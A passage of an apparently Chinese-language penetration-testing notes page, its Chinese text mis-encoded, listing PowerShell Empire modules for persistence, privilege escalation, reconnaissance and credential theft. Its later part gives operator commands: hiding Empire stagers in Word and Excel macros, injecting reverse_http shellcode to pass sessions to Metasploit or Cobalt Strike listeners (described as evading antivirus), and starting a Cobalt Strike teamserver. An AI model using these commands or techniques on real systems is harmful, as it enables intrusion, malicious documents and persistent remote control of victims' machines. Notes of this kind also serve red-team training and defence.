<td>å°†PIC Shellcode Payloadæ³¨å…¥ç›®æ ‡è¿›ç¨‹</td>
</tr>
<tr>
<td>management/sid_to_user</td>
<td>å°†æŒ‡å®šçš„åŸŸsidè½¬æ¢ä¸ºç”¨æˆ·</td>
</tr>
<tr>
<td>management/spawn</td>
<td>åœ¨æ–°çš„powershell.exeè¿›ç¨‹ä¸­ç”Ÿæˆæ–°agent</td>
</tr>
<tr>
<td>management/spawnas</td>
<td>ä½¿ç”¨æŒ‡å®šçš„ç™»å½•å‡­æ®ç”Ÿæˆagent</td>
</tr>
<tr>
<td>management/switch_listener</td>
<td>åˆ‡æ¢listener</td>
</tr>
<tr>
<td>management/timestomp</td>
<td>é€šè¿‡â€™è°ƒç”¨Set-MacAttributeæ‰§è¡Œç±»ä¼¼è€—æ—¶çš„åŠŸèƒ½</td>
</tr>
<tr>
<td>management/user_to_sid</td>
<td>å°†æŒ‡å®šçš„domain\userè½¬æ¢ä¸ºdomain sid</td>
</tr>
<tr>
<td>management/vnc</td>
<td>Invoke-Vncåœ¨å†…å­˜ä¸­æ‰§è¡ŒVNCä»£ç†å¹¶å¯åŠ¨åå‘è¿æ¥</td>
</tr>
<tr>
<td>management/wdigest_downgrade*</td>
<td>å°†è®¡ç®—æœºä¸Šçš„wdigestè®¾ç½®ä¸ºä½¿ç”¨æ˜¾å¼å‡­æ®</td>
</tr>
<tr>
<td>management/zipfolder</td>
<td>å‹ç¼©ç›®æ ‡æ–‡ä»¶å¤¹ä»¥ä¾›ä»¥åæ¸—é€</td>
</tr>
<tr>
<td>management/mailraider/disable_security</td>
<td>æ­¤å‡½æ•°æ£€æŸ¥ObjectModelGuard</td>
</tr>
<tr>
<td>management/mailraider/get_emailitems</td>
<td>è¿”å›æŒ‡å®šæ–‡ä»¶å¤¹çš„æ‰€æœ‰é¡¹ç›®</td>
</tr>
<tr>
<td>management/mailraider/get_subfolders</td>
<td>è¿”å›æŒ‡å®šé¡¶çº§æ–‡ä»¶å¤¹ä¸­æ‰€æœ‰æ–‡ä»¶å¤¹çš„åˆ—è¡¨</td>
</tr>
<tr>
<td>management/mailraider/mail_search</td>
<td>åœ¨ç»™å®šçš„Outlookæ–‡ä»¶å¤¹ä¸­æœç´¢é¡¹ç›®</td>
</tr>
<tr>
<td>management/mailraider/search_gal</td>
<td>è¿”å›ä¸æŒ‡å®šæœç´¢æ¡ä»¶åŒ¹é…çš„æ‰€æœ‰exchange users</td>
</tr>
<tr>
<td>management/mailraider/send_mail</td>
<td>ä½¿ç”¨è‡ªå®šä¹‰æˆ–é»˜è®¤æ¨¡æ¿å°†ç”µå­é‚®ä»¶å‘é€åˆ°æŒ‡å®šåœ°å€ã€‚</td>
</tr>
<tr>
<td>management/mailraider/view_email</td>
<td>é€‰æ‹©æŒ‡å®šçš„æ–‡ä»¶å¤¹ï¼Œç„¶ååœ¨æŒ‡å®šçš„ç´¢å¼•å¤„è¾“å‡ºç”µå­é‚®ä»¶é¡¹ç›®</td>
</tr>
</tbody></table>
<h4 id="Persistenceï¼ˆæŒä¹…åŒ–ï¼‰"><a href="#Persistenceï¼ˆæŒä¹…åŒ–ï¼‰" class="headerlink" title="Persistenceï¼ˆæŒä¹…åŒ–ï¼‰"></a>Persistenceï¼ˆæŒä¹…åŒ–ï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>persistence/elevated/registry*</td>
<td>è®¡ç®—æœºå¯åŠ¨é¡¹æŒä¹…åŒ–ï¼Œé€šè¿‡HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Runè¿›è¡ŒæŒä¹…åŒ–ï¼Œè¿è¡Œä¸€ä¸ªstageræˆ–è€…è„šæœ¬</td>
</tr>
<tr>
<td>persistence/elevated/schtasks*</td>
<td>è®¡åˆ’ä»»åŠ¡æŒä¹…åŒ–</td>
</tr>
<tr>
<td>persistence/elevated/wmi*</td>
<td>WMIäº‹ä»¶è®¢é˜…æŒä¹…åŒ–</td>
</tr>
<tr>
<td>persistence/elevated/wmi_updater*</td>
<td>WMIè®¢é˜…æŒä¹…åŒ–</td>
</tr>
<tr>
<td>persistence/misc/add_netuser</td>
<td>å°†åŸŸç”¨æˆ·æˆ–æœ¬åœ°ç”¨æˆ·æ·»åŠ åˆ°å½“å‰ï¼ˆæˆ–è¿œç¨‹ï¼‰è®¡ç®—æœº</td>
</tr>
<tr>
<td>persistence/misc/add_sid_history*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»¥æ‰§è¡Œmisc::addsidä»¥æ·»åŠ ç”¨æˆ·çš„sidå†å²è®°å½•ã€‚ ä»…é€‚ç”¨äºåŸŸæ§åˆ¶å™¨</td>
</tr>
<tr>
<td>persistence/misc/debugger*</td>
<td>å°†æŒ‡å®šç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶çš„è°ƒè¯•å™¨è®¾ç½®ä¸ºcmd.exe</td>
</tr>
<tr>
<td>persistence/misc/disable_machine_acct_change*</td>
<td>ç¦æ­¢ç›®æ ‡ç³»ç»Ÿçš„æœºå™¨å¸æˆ·è‡ªåŠ¨æ›´æ”¹å…¶å¯†ç </td>
</tr>
<tr>
<td>persistence/misc/get_ssps</td>
<td>æšä¸¾æ‰€æœ‰å·²åŠ è½½çš„å®‰å…¨è½¯ä»¶åŒ…</td>
</tr>
<tr>
<td>persistence/misc/install_ssp*</td>
<td>å®‰è£…å®‰å…¨æ”¯æŒæä¾›ç¨‹åºdll</td>
</tr>
<tr>
<td>persistence/misc/memssp*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»¥æ‰§è¡Œmisc::memsspï¼Œå°†æ‰€æœ‰èº«ä»½éªŒè¯äº‹ä»¶è®°å½•åˆ°C:\Windows\System32\mimisla.log</td>
</tr>
<tr>
<td>persistence/misc/skeleton_key*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°æ¥æ‰§è¡Œmisc::skeletonï¼Œæ¤å…¥å¯†ç mimikatzçš„ä¸‡èƒ½é’¥åŒ™ã€‚ ä»…é€‚ç”¨äºåŸŸæ§åˆ¶å™¨</td>
</tr>
<tr>
<td>persistence/powerbreach/deaduser</td>
<td>DeadUserBackdooråé—¨ï¼Œè¯¦ç»†ä¿¡æ¯ï¼š<a target="_blank" rel="noopener" href="http://www.sixdub.net/?p=535">http://www.sixdub.net/?p=535</a></td>
</tr>
<tr>
<td>persistence/powerbreach/eventlog*</td>
<td>å¯åŠ¨äº‹ä»¶å¾ªç¯åé—¨</td>
</tr>
<tr>
<td>persistence/powerbreach/resolver</td>
<td>å¯åŠ¨è§£æå™¨åé—¨</td>
</tr>
<tr>
<td>persistence/userland/backdoor_lnk</td>
<td>LNKæ–‡ä»¶åé—¨</td>
</tr>
<tr>
<td>persistence/userland/registry</td>
<td>è®¡ç®—æœºå¯åŠ¨é¡¹æŒä¹…åŒ–ï¼Œé€šè¿‡HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Runè¿›è¡ŒæŒä¹…åŒ–ï¼Œè¿è¡Œä¸€ä¸ªstageræˆ–è€…è„šæœ¬</td>
</tr>
<tr>
<td>persistence/userland/schtasks</td>
<td>è®¡åˆ’ä»»åŠ¡æŒä¹…åŒ–</td>
</tr>
</tbody></table>
<h4 id="Privescï¼ˆæƒé™æå‡ï¼‰"><a href="#Privescï¼ˆæƒé™æå‡ï¼‰" class="headerlink" title="Privescï¼ˆæƒé™æå‡ï¼‰"></a>Privescï¼ˆæƒé™æå‡ï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>privesc/ask</td>
<td>å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œè¯¢é—®ç”¨æˆ·æ˜¯å¦è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œpowershell</td>
</tr>
<tr>
<td>privesc/bypassuac</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_env</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_eventvwr</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_fodhelper</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_sdctlbypass</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_tokenmanipulation</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_wscript</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/getsystem*</td>
<td>è·å–systemç‰¹æƒ</td>
</tr>
<tr>
<td>privesc/gpp</td>
<td>åˆ©ç”¨windowsç»„ç­–ç•¥é¦–é€‰é¡¹ç¼ºé™·è·å–ç³»ç»Ÿå¸å·</td>
</tr>
<tr>
<td>privesc/mcafee_sitelist</td>
<td>å¯»æ‰¾McAfee SiteList.xmlæ–‡ä»¶çš„çº¯æ–‡æœ¬å¯†ç </td>
</tr>
<tr>
<td>privesc/ms16-032</td>
<td>MS16-032æœ¬åœ°ææƒ</td>
</tr>
<tr>
<td>privesc/ms16-135</td>
<td>MS16-135æœ¬åœ°ææƒ</td>
</tr>
<tr>
<td>privesc/tater</td>
<td>åˆ©ç”¨PowerShellå®ç°çš„Hot Potatoææƒ</td>
</tr>
<tr>
<td>privesc/powerup/allchecks</td>
<td>æ£€æŸ¥ç›®æ ‡ä¸»æœºçš„æ”»å‡»å‘é‡ä»¥è¿›è¡Œæƒé™æå‡</td>
</tr>
<tr>
<td>privesc/powerup/find_dllhijack</td>
<td>æŸ¥æ‰¾é€šç”¨çš„.DLLåŠ«æŒ</td>
</tr>
<tr>
<td>privesc/powerup/service_exe_restore</td>
<td>è¿˜åŸå¤‡ä»½çš„æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶</td>
</tr>
<tr>
<td>privesc/powerup/service_exe_stager</td>
<td>å¤‡ä»½æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ç”¨å¯åŠ¨stager.batçš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢åŸå§‹æ–‡ä»¶</td>
</tr>
<tr>
<td>privesc/powerup/service_exe_useradd</td>
<td>ä¿®æ”¹ç›®æ ‡æœåŠ¡ä»¥åˆ›å»ºæœ¬åœ°ç”¨æˆ·å¹¶å°†å…¶æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜</td>
</tr>
<tr>
<td>privesc/powerup/service_stager</td>
<td>ä¿®æ”¹ç›®æ ‡æœåŠ¡ä»¥æ‰§è¡ŒEmpire stager</td>
</tr>
<tr>
<td>privesc/powerup/service_useradd</td>
<td>ä¿®æ”¹ç›®æ ‡æœåŠ¡ä»¥åˆ›å»ºæœ¬åœ°ç”¨æˆ·å¹¶å°†å…¶æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜</td>
</tr>
<tr>
<td>privesc/powerup/write_dllhijacker</td>
<td>å°†å¯åŠ«æŒçš„.dllä»¥åŠ.dllè°ƒç”¨çš„stager.batä¸€èµ·å†™åˆ°æŒ‡å®šè·¯å¾„ã€‚ wlbsctrl.dllåœ¨Windows 7ä¸Šè¿è¡Œè‰¯å¥½ã€‚éœ€è¦é‡æ–°å¯åŠ¨è®¡ç®—æœº</td>
</tr>
</tbody></table>
<h4 id="Reconï¼ˆä¾¦å¯Ÿï¼‰"><a href="#Reconï¼ˆä¾¦å¯Ÿï¼‰" class="headerlink" title="Reconï¼ˆä¾¦å¯Ÿï¼‰"></a>Reconï¼ˆä¾¦å¯Ÿï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>recon/find_fruit</td>
<td>åœ¨ç½‘ç»œèŒƒå›´å†…æœç´¢æ½œåœ¨çš„æ˜“å—æ”»å‡»çš„WebæœåŠ¡</td>
</tr>
<tr>
<td>recon/get_sql_server_login_default_pw</td>
<td>å‘ç°åœ¨å½“å‰å¹¿æ’­åŸŸä¹‹å†…çš„SQL Serverå®ä¾‹</td>
</tr>
<tr>
<td>recon/http_login</td>
<td>é’ˆå¯¹åŸºæœ¬èº«ä»½éªŒè¯æµ‹è¯•å‡­æ®</td>
</tr>
</tbody></table>
<h4 id="Situational-awarenessï¼ˆæ€åŠ¿æ„ŸçŸ¥ï¼‰"><a href="#Situational-awarenessï¼ˆæ€åŠ¿æ„ŸçŸ¥ï¼‰" class="headerlink" title="Situational_awarenessï¼ˆæ€åŠ¿æ„ŸçŸ¥ï¼‰"></a>Situational_awarenessï¼ˆæ€åŠ¿æ„ŸçŸ¥ï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>situational_awareness/host/antivirusproduct</td>
<td>è·å–é˜²ç—…æ¯’äº§å“ä¿¡æ¯</td>
</tr>
<tr>
<td>situational_awareness/host/computerdetails*</td>
<td>æšä¸¾æœ‰å…³ç³»ç»Ÿçš„æœ‰ç”¨ä¿¡æ¯</td>
</tr>
<tr>
<td>situational_awareness/host/dnsserver</td>
<td>æšä¸¾ç³»ç»Ÿä½¿ç”¨çš„DNSæœåŠ¡å™¨</td>
</tr>
<tr>
<td>situational_awareness/host/findtrusteddocuments</td>
<td>è¯¥æ¨¡å—å°†æšä¸¾é€‚å½“çš„æ³¨å†Œè¡¨</td>
</tr>
<tr>
<td>situational_awareness/host/get_pathacl</td>
<td>æšä¸¾ç»™å®šæ–‡ä»¶è·¯å¾„çš„ACL</td>
</tr>
<tr>
<td>situational_awareness/host/get_proxy</td>
<td>æšä¸¾å½“å‰ç”¨æˆ·çš„ä»£ç†æœåŠ¡å™¨å’ŒWPADå†…å®¹</td>
</tr>
<tr>
<td>situational_awareness/host/get_uaclevel</td>
<td>æšä¸¾UACçº§åˆ«</td>
</tr>
<tr>
<td>situational_awareness/host/monitortcpconnections</td>
<td>ç›‘è§†ä¸»æœºä¸æŒ‡å®šåŸŸåæˆ–IPv4åœ°å€çš„TCPè¿æ¥ï¼Œå¯¹äºä¼šè¯åŠ«æŒå’ŒæŸ¥æ‰¾ä¸æ•æ„ŸæœåŠ¡è¿›è¡Œäº¤äº’çš„ç”¨æˆ·å¾ˆæœ‰ç”¨</td>
</tr>
<tr>
<td>situational_awareness/host/paranoia*</td>
<td>æŒç»­æ£€æŸ¥è¿è¡Œè¿‡ç¨‹ä¸­æ˜¯å¦å­˜åœ¨å¯ç–‘ç”¨æˆ·</td>
</tr>
<tr>
<td>situational_awareness/host/winenum</td>
<td>æ”¶é›†æœ‰å…³ä¸»æœºå’Œå½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡çš„ç›¸å…³ä¿¡æ¯</td>
</tr>
<tr>
<td>situational_awareness/network/arpscan</td>
<td>é’ˆå¯¹ç»™å®šèŒƒå›´çš„IPv4 IPåœ°å€æ‰§è¡ŒARPæ‰«æ</td>
</tr>
<tr>
<td>situational_awareness/network/bloodhound</td>
<td>æ‰§è¡ŒBloodHoundæ•°æ®æ”¶é›†</td>
</tr>
<tr>
<td>situational_awareness/network/get_exploitable_system</td>
<td>æŸ¥è¯¢Active Directoryä»¥æŸ¥æ‰¾å¯èƒ½å®¹æ˜“å—åˆ°Metasploit Exploitçš„ç³»ç»Ÿ</td>
</tr>
<tr>
<td>situational_awareness/network/get_spn</td>
<td>è·å–æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼‰</td>
</tr>
<tr>
<td>situational_awareness/network/get_sql_instance_domain</td>
<td>è¿”å›SQL Serverå®ä¾‹åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/get_sql_server_info</td>
<td>ä»ç›®æ ‡SQL Serverè¿”å›åŸºæœ¬æœåŠ¡å™¨å’Œç”¨æˆ·ä¿¡æ¯</td>
</tr>
<tr>
<td>situational_awareness/network/portscan</td>
<td>ä½¿ç”¨å¸¸è§„å¥—æ¥å­—è¿›è¡Œç®€å•çš„ç«¯å£æ‰«æ</td>
</tr>
<tr>
<td>situational_awareness/network/reverse_dns</td>
<td>æ‰§è¡Œç»™å®šIPv4 IPèŒƒå›´çš„DNSåå‘æŸ¥æ‰¾</td>
</tr>
<tr>
<td>situational_awareness/network/smbautobrute</td>
<td>é’ˆå¯¹ç”¨æˆ·å/å¯†ç åˆ—è¡¨è¿è¡ŒSMBæš´åŠ›ç ´è§£</td>
</tr>
<tr>
<td>situational_awareness/network/smbscanner</td>
<td>åœ¨å¤šå°æœºå™¨ä¸Šæµ‹è¯•ç”¨æˆ·å/å¯†ç ç»„åˆ</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_foreign_group</td>
<td>æšä¸¾ç»™å®šåŸŸçš„ç»„çš„æ‰€æœ‰æˆå‘˜ï¼Œå¹¶æŸ¥æ‰¾ä¸åœ¨æŸ¥è¯¢åŸŸä¸­çš„ç”¨æˆ·</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_foreign_user</td>
<td>æšä¸¾åœ¨å…¶ä¸»åŸŸä¹‹å¤–çš„ç»„ä¸­çš„ç”¨æˆ·</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_gpo_computer_admin</td>
<td>è·å–è®¡ç®—æœºï¼ˆæˆ–GPOï¼‰å¯¹è±¡ï¼Œå¹¶ç¡®å®šå“ªäº›ç”¨æˆ·/ç»„å¯¹è¯¥å¯¹è±¡å…·æœ‰ç®¡ç†è®¿é—®æƒé™</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_gpo_location</td>
<td>è·å–ç”¨æˆ·åæˆ–ç»„åï¼Œå¹¶ç¡®å®šå…¶å…·æœ‰é€šè¿‡GPOè¿›è¡Œç®¡ç†è®¿é—®çš„è®¡ç®—æœº</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_localadmin_access</td>
<td>åœ¨å½“å‰ç”¨æˆ·å…·æœ‰â€œæœ¬åœ°ç®¡ç†å‘˜â€è®¿é—®æƒé™çš„æœ¬åœ°åŸŸä¸ŠæŸ¥æ‰¾è®¡ç®—æœº</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_managed_security_group</td>
<td>æ­¤åŠŸèƒ½æ£€ç´¢åŸŸä¸­çš„æ‰€æœ‰å®‰å…¨ç»„</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_cached_rdpconnection</td>
<td>ä½¿ç”¨è¿œç¨‹æ³¨å†Œè¡¨åŠŸèƒ½æ¥æŸ¥è¯¢è®¡ç®—æœºä¸Šâ€œ Windowsè¿œç¨‹æ¡Œé¢è¿æ¥å®¢æˆ·ç«¯â€çš„æ‰€æœ‰ä¿¡æ¯</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_computer</td>
<td>æŸ¥è¯¢å½“å‰è®¡ç®—æœºå¯¹è±¡çš„åŸŸ</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_dfs_share</td>
<td>è¿”å›ç»™å®šåŸŸçš„æ‰€æœ‰å®¹é”™åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿçš„åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_domain_controller</td>
<td>è¿”å›å½“å‰åŸŸæˆ–æŒ‡å®šåŸŸçš„åŸŸæ§åˆ¶å™¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_domain_policy</td>
<td>è¿”å›ç»™å®šåŸŸæˆ–åŸŸæ§åˆ¶å™¨çš„é»˜è®¤åŸŸæˆ–DCç­–ç•¥</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_domain_trust</td>
<td>è¿”å›å½“å‰åŸŸæˆ–æŒ‡å®šåŸŸçš„æ‰€æœ‰åŸŸä¿¡ä»»</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_fileserver</td>
<td>è¿”å›ä»ç”¨æˆ·ä¸»ç›®å½•æå–çš„æ‰€æœ‰æ–‡ä»¶æœåŠ¡å™¨çš„åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_forest</td>
<td>è¿”å›æœ‰å…³ç»™å®šåŸŸæ£®æ—çš„ä¿¡æ¯</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_forest_domain</td>
<td>è¿”å›ç»™å®šæ—çš„æ‰€æœ‰åŸŸ</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_gpo</td>
<td>è·å–åŸŸä¸­æ‰€æœ‰å½“å‰GPOçš„åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_group</td>
<td>è·å–åŸŸä¸­æ‰€æœ‰å½“å‰ç»„çš„åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_group_member</td>
<td>è¿”å›ç»™å®šç»„çš„æˆå‘˜</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_localgroup</td>
<td>è¿”å›æœ¬åœ°æˆ–è¿œç¨‹è®¡ç®—æœºä¸ŠæŒ‡å®šæœ¬åœ°ç»„ä¸­æ‰€æœ‰å½“å‰ç”¨æˆ·çš„åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_loggedon</td>
<td>æ‰§è¡ŒNetWkstaUserEnum Win32APIè°ƒç”¨ä»¥æŸ¥è¯¢ä¸»åŠ¨ç™»å½•ä¸»æœºçš„ç”¨æˆ·</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_object_acl</td>
<td>è¿”å›ä¸ç‰¹å®šæ´»åŠ¨ç›®å½•å¯¹è±¡å…³è”çš„ACL</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_ou</td>
<td>è·å–åŸŸä¸­æ‰€æœ‰å½“å‰OUçš„åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_rdp_session</td>
<td>åœ¨ç»™å®šçš„RDPè¿œç¨‹æœåŠ¡ä¸­æŸ¥è¯¢æ´»åŠ¨ä¼šè¯å’ŒåŸå§‹IP</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_session</td>
<td>æ‰§è¡ŒNetSessionEnum Win32APIè°ƒç”¨ä»¥æŸ¥è¯¢ä¸»æœºä¸Šçš„æ´»åŠ¨ä¼šè¯</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_site</td>
<td>è·å–åŸŸä¸­æ‰€æœ‰å½“å‰ç«™ç‚¹çš„åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_subnet</td>
<td>è·å–åŸŸä¸­æ‰€æœ‰å½“å‰å­ç½‘çš„åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_user</td>
<td>æŸ¥è¯¢ç»™å®šç”¨æˆ·æˆ–æŒ‡å®šåŸŸä¸­ç”¨æˆ·çš„ä¿¡æ¯</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/map_domain_trust</td>
<td>ä½¿ç”¨.CSVè¾“å‡ºæ˜ å°„æ‰€æœ‰å¯è®¿é—®çš„åŸŸä¿¡ä»»</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/process_hunter</td>
<td>æŸ¥è¯¢è¿œç¨‹æœºå™¨çš„è¿›ç¨‹åˆ—è¡¨</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/set_ad_object</td>
<td>ä½¿ç”¨SIDï¼Œåç§°æˆ–SamAccountNameæ¥æŸ¥è¯¢æŒ‡å®šçš„åŸŸå¯¹è±¡</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/share_finder</td>
<td>åœ¨åŸŸä¸­çš„è®¡ç®—æœºä¸ŠæŸ¥æ‰¾å…±äº«</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/user_hunter</td>
<td>æŸ¥æ‰¾æŒ‡å®šç»„çš„ç”¨æˆ·ç™»å½•çš„æœºå™¨</td>
</tr>
</tbody></table>
<h4 id="Trollsploitï¼ˆæ¶ä½œå‰§ï¼‰"><a href="#Trollsploitï¼ˆæ¶ä½œå‰§ï¼‰" class="headerlink" title="Trollsploitï¼ˆæ¶ä½œå‰§ï¼‰"></a>Trollsploitï¼ˆæ¶ä½œå‰§ï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>trollsploit/get_schwifty</td>
<td>æ’­æ”¾Schwiftyè§†é¢‘ï¼ŒåŒæ—¶æŠŠè®¡ç®—æœºéŸ³é‡è®¾ç½®æœ€å¤§</td>
</tr>
<tr>
<td>trollsploit/message</td>
<td>å‘é€ä¸€ä¸ªæ¶ˆæ¯æ¡†</td>
</tr>
<tr>
<td>trollsploit/process_killer</td>
<td>ç»ˆæ­¢ä»¥ç‰¹å®šåç§°å¼€å¤´çš„ä»»ä½•è¿›ç¨‹</td>
</tr>
<tr>
<td>trollsploit/rick_ascii</td>
<td>ç”Ÿæˆä¸€ä¸ªæ–°çš„powershell.exeè¿›ç¨‹è¿è¡ŒLee Holmesâ€™ ASCII Rick Roll</td>
</tr>
<tr>
<td>trollsploit/rick_astley</td>
<td>è¿è¡ŒSadProcessorâ€™s beeping rickroll</td>
</tr>
<tr>
<td>trollsploit/thunderstruck</td>
<td>æ’­æ”¾Thunderstruckè§†é¢‘ï¼ŒåŒæ—¶æŠŠè®¡ç®—æœºéŸ³é‡è®¾ç½®æœ€å¤§</td>
</tr>
<tr>
<td>trollsploit/voicetroll</td>
<td>é€šè¿‡ç›®æ ‡ä¸Šçš„åˆæˆè¯­éŸ³æœ—è¯»æ–‡æœ¬</td>
</tr>
<tr>
<td>trollsploit/wallpaper</td>
<td>å°†.jpgå›¾ç‰‡ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨å¹¶å°†å…¶è®¾ç½®ä¸ºæ¡Œé¢å£çº¸</td>
</tr>
<tr>
<td>trollsploit/wlmdr</td>
<td>åœ¨ä»»åŠ¡æ ä¸­æ˜¾ç¤ºæ°”çƒæç¤º</td>
</tr>
</tbody></table>
<h4 id="Empire-Word"><a href="#Empire-Word" class="headerlink" title="Empire Word"></a>Empire Word</h4><pre><code>&gt;usestager windows/launcher_batç”Ÿæˆbatæœ¨é©¬ï¼Œè®¾ç½®Listener
Word/Excel-&gt;æ’å…¥-&gt;å¯¹è±¡-&gt;ç”±æ–‡ä»¶åˆ›å»ºï¼Œé€‰æ‹©batï¼Œæ˜¾ç¤ºä¸ºå›¾æ ‡ï¼Œä¿®æ”¹å›¾æ ‡
Macro
&gt;usestager windows/macro è®¾ç½®Listener
Word/Excel-&gt;è¯•å›¾-&gt;å®-&gt;åˆ›å»ºï¼Œå¤åˆ¶macroè¿›å»
</code></pre>
<h4 id="Empireæ´¾ç”ŸCobalt-Strikeå’ŒMSF"><a href="#Empireæ´¾ç”ŸCobalt-Strikeå’ŒMSF" class="headerlink" title="Empireæ´¾ç”ŸCobalt Strikeå’ŒMSF"></a>Empireæ´¾ç”ŸCobalt Strikeå’ŒMSF</h4><h5 id="æ´¾ç”ŸMSF"><a href="#æ´¾ç”ŸMSF" class="headerlink" title="æ´¾ç”ŸMSF"></a>æ´¾ç”ŸMSF</h5><pre><code>å¯ç»•è¿‡æ€è½¯
Empire
&gt;usemodule code_execution/invoke_shellcode
&gt;set Lhost 192.168.0.1
&gt;set Lport 4444
&gt;set Payload reverse_http
MSF
&gt;use exploit/multi/handler
&gt;set payloadwindows/meterpreter/reverse_http
&gt;set Lhost 192.168.31.247
&gt;set lport 4444
&gt;run
æˆ–Empire
&gt;usemodule code_execution/invoke_metasploitpayload
&gt;set URL http://SRVHOST:SRVPORT
MSF
#use exploit/multi/script/web_delivery
#set payload windows/x64/meterpreter/reverse_tcp
è®¾ç½®SRVHOST SRVPORT
</code></pre>
<h5 id="æ´¾ç”ŸCobalt-Strike-1"><a href="#æ´¾ç”ŸCobalt-Strike-1" class="headerlink" title="æ´¾ç”ŸCobalt Strike"></a>æ´¾ç”ŸCobalt Strike</h5><pre><code>åˆ›å»ºç›‘å¬å™¨/windows/beacon_http/reverse_http è®¾ç½®ç«¯å£å’Œä¸»æœº
Empire
&gt;usemodule code_execution/invoke_shellcode
&gt;set Lhost 192.168.0.1
&gt;set Lport 4444
&gt;set Payload reverse_http
</code></pre>
<h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><h4 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><pre><code>éœ€è¦JDKç¯å¢ƒ
&gt;tar -xzvf jdk-8u191-linux-x64.tar.gz
</code></pre>
<h4 id="éƒ¨ç½²TeamServer"><a href="#éƒ¨ç½²TeamServer" class="headerlink" title="éƒ¨ç½²TeamServer"></a>éƒ¨ç½²TeamServer</h4><pre><code>&gt;./teamserver 192.168.0.107 123456
æ ¼å¼æ˜¯å¤–ç½‘IPå’Œå¯†ç 
</code></pre>
<h4 id="æ¨¡å—-1"><a href="#æ¨¡å—-1" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h4><pre><code>New Connectionï¼šæ–°å»ºè¿æ¥
Preferencesï¼šè®¾ç½®å¤–è§‚
Visualizationï¼šæŸ¥çœ‹ä¸»æœºçš„ä¸åŒå½¢å¼
VPN Interfacesï¼š VPNæ¥å£
Listenersï¼šç›‘å¬å™¨
Script Interfacesï¼šæŸ¥çœ‹å’ŒåŠ è½½CNAè„šæœ¬
Closeï¼šå…³é—­CS
</code></pre>
